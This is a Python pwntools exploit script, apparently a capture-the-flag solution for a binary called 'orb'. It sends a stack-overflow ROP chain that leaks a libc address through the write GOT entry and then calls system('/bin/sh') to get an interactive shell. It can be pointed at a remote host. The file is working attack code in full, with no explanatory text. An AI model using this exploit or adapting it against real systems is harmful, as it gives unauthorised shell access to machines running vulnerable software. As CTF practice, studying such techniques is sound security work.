#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from warnings import filterwarnings

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'orb')
libc = exe.libc
filterwarnings("ignore")
context.log_level = 'debug'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
break *main+117
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global libc
    global io
    global elf

    io = start()


def rop():
    offset = 40
    pop_rdi = 0x000000000040127b
    pop_rsi_r15 = 0x0000000000401279
    ret = 0x0000000000401016

    payload = flat({
        offset: [
            pop_rdi,
            0x1,
            pop_rsi_r15,
            exe.got['write'],
            0x0,
            exe.plt['write'],
            exe.sym['main']
        ]
    })

    io.sendline(payload)
    io.recvuntil('work..')
    io.recvline()
    io.recvline()
    leak = unpack(io.recv(7)[1:].ljust(8, b'\x00'))
    libc.address = leak - libc.sym['write']
    system = libc.sym['system']
    sh = next(libc.search(b'/bin/sh\x00'))

    info("libc base address: %#x", libc.address)
    info("system address: %#x", system)


    payload = flat({
        offset: [
            pop_rdi,
            sh,
            system
        ]
    })

    io.sendline(payload)

    io.interactive()


def main():
    
    init()
    rop()
    

if __name__ == '__main__':
    main()

